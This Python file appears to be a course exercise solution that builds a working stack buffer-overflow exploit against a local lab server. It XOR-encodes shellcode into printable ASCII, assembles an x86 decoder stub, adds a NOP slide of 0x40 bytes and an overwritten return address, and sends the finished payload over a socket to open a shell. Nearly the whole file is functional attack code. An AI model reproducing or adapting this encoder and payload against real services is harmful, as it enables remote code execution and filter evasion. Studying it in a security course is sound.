import functools
import os
import socket
import traceback
import q2
import struct

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    encoded_indices = []
    data = bytearray(data)
    for i, b in enumerate(data):
        if b > ASCII_MAX:
            data[i] ^= 0xff
            encoded_indices.append(i)
    return bytes(data), encoded_indices


@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    decoder_asm = (
    "push 0x55\n"
    "pop ebx\n"
    "push 0x55\n"
    "add ebx, [esp]\n"
    "add ebx, [esp]\n"
    "pop ecx\n"
    )
    
    for i in indices: # Our encoded shellcode is only 112 bytes long, so we never get i > 0x7f
        decoder_asm += f"XOR byte ptr [EAX + {i}], bl\n"

    return assemble.assemble_data(decoder_asm)


@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode = get_raw_shellcode()
    encoded_shellcode, indices = encode(q2_shellcode)
    decoder = get_decoder_code(indices)
    
    esp_code = (
    "push esp\n"
    "pop eax\n"
    "push 0x74\n"
    "sub eax, [esp]\n"
    "pop ecx\n"
    )
    
    return assemble.assemble_data(esp_code) + decoder + encoded_shellcode


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    shellcode = get_ascii_shellcode()
    buffer_size = 1552
    nop_slide = b'\x40' * (buffer_size - len(shellcode))
    
    return_address = 0xbfffdb0c + len(nop_slide)//2
    return_address = return_address.to_bytes(4, byteorder='little')
    
    msg = nop_slide + shellcode + return_address
    
    payload = struct.pack('>i', len(msg)+1) + msg + b'\x00'
    return payload 


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
